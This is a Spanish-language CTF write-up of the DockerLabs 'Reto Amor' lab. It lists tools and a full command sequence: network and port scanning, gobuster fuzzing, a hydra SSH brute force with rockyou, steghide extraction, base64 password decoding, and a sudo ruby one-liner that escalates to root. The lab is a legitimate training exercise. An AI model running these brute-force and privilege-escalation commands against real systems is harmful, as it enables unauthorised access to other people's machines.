**Mayor DIEGO A. ESMERAL M.**

# 🧪 Reto Amor - DockerLabs

Este repositorio documenta el desarrollo completo del laboratorio **Reto Amor** de la plataforma [DockerLabs.es](https://dockerlabs.es/), nivel **Fácil**. El objetivo fue desplegar una máquina vulnerable en Docker, realizar tareas de reconocimiento, explotación y escalamiento de privilegios mediante herramientas de hacking ético.

---

## 📦 Requisitos Previos

- Kali Linux (actualizado)
- Docker instalado: `sudo apt install docker.io`
- Carpeta `amor` transferida al entorno Kali mediante `scp`.

---

## 🔧 Herramientas Empleadas

| Herramienta | Definición | Funcionalidad | Casos de uso |
|------------|------------|---------------|--------------|
| **Docker** | Plataforma de contenedores para ejecutar aplicaciones en entornos aislados. | Simula entornos virtuales ligeros. | Laboratorios, CI/CD, microservicios. |
| **scp** | Copia segura de archivos entre máquinas mediante SSH. | Transferencia recursiva de carpetas. | Envío de archivos/scripts entre hosts. |
| **netdiscover** | Herramienta ARP para descubrir IPs activas. | Muestra IP, MAC y fabricante. | Reconocimiento de red local. |
| **nmap** | Escáner de puertos y servicios. | Escaneo completo de red y servicios. | Pentesting, auditoría, fingerprinting. |
| **gobuster** | Fuerza bruta de directorios web. | Descubre rutas y archivos ocultos. | Enumeración web ofensiva. |
| **hydra** | Ataques de fuerza bruta contra servicios. | Prueba múltiples contraseñas/usuarios. | Auditoría de credenciales débiles. |
| **steghide** | Esteganografía en imágenes/audio. | Extrae/oculta archivos en JPG/WAV. | CTF, forense, comunicaciones ocultas. |
| **base64** | Codificación binaria a texto. | Decodifica datos encubiertos. | Mensajes ocultos, manipulación de datos. |

---

## 🛠️ Desglose de Comandos Utilizados

```bash
# 1. Transferir carpeta
scp -r amor kali@192.168.1.12:/home/kali/Documents/

# 2. Instalar Docker (si aplica)
sudo apt install docker.io

# 3. Desplegar máquina
cd Documents/amor
chmod +x auto_deploy.sh
./auto_deploy.sh amor.tar

# 4. Obtener interfaz de red
ip add

# 5. Escaneo de red en docker0
sudo netdiscover -i docker0 -r 172.17.0.0/24

# 6. Escanear puertos abiertos
sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2

# 7. Fuzzing web
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 8. Fuerza bruta SSH
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10

# 9. Acceso por SSH
ssh carlota@172.17.0.2

# 10. Buscar imagen
cd /carlota/Desktop/fotos/vacaciones

# 11. Descargar imagen a Kali
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor



# 12. Extraer contenido oculto
steghide extract -sf imagen.jpg

# 13. Decodificar mensaje oculto
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo

# 14. Escalada de privilegios
su oscar
sudo -l
sudo /usr/bin/ruby -e 'exec "/bin/bash"'

✅ Resultado Final
Al finalizar el laboratorio se logra:

Identificar servicios expuestos (22, 80).

Obtener acceso SSH por fuerza bruta.

Detectar archivo con datos esteganográficos.

Decodificar contraseña y escalar privilegios a root.

DIAGRAMA DE FLUJO

![Diagrama de Flujo](DiagrammeAMOR.png)

